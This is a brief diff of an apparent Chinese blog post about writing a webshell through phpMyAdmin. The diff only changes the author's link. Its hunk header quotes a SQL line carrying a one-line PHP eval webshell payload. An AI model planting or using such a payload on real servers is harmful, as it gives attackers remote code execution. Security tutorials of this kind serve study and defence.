@@ -55,6 +55,6 @@ select '<?php @eval($_POST[1]);?>';
 
 ---
 
-> 作者: [剑胆琴心](http://geoer.cn)  
+> 作者: [剑胆琴心](http://shuai06.github.io)  
 > URL: https://shuai06.github.io/phpmyadmin%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99webshell/  
 
